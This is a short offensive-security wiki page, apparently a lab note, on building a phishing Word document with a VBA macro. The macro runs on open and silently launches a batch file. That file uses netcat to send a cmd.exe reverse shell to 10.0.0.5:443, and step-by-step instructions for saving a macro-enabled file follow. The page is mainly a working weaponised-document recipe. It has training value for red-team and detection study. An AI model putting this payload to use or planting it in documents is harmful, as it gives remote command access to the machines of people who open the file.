---
description: MITRE ATT&CK™ T1137 - Phishing
---
# Visual Basic for Application (VBA)

## Theory

This technique will build a primitive word document that will auto execute the VBA Macros code once the Macros protection is disabled.

VBA stands for Visual Basic for Applications, a programming language by Microsoft implemented for Microsoft applications such as Microsoft Word, Excel, PowerPoint, etc. VBA programming allows automating tasks of nearly every keyboard and mouse interaction between a user and Microsoft Office applications. 

{% hint style="error" %}
VBAs/macros by themselves do not inherently bypass any detections.
{% endhint %}

## Practice


{% tabs %}

{% tab title="Basic Usage" %}

1 - Create new word document (CTRL+N)
2 - Hit ALT+F11 to go into Macro editor
3 - Double click into the "This document" and CTRL+C/V the below:

```bash
#Macro
Private Sub Document_Open()
  MsgBox "game over", vbOKOnly, "game over"
  a = Shell("C:\tools\shell.cmd", vbHide)
End Sub
```

```bash
#C:\tools\shell.cmd
C:\tools\nc.exe 10.0.0.5 443 -e C:\Windows\System32\cmd.exe
```

4 - ALT+F11 to switch back to the document editing mode
5 - Save the file as a macro enabled document, for example as dotm, Word 97-2003 Document.  


{% endtab %}

{% endtabs %}

## Resources

{% embed url="https://tryhackme.com/room/weaponization" %}
{% embed url="https://www.ired.team/offensive-security/code-execution/t1216-signed-script-ce" %}
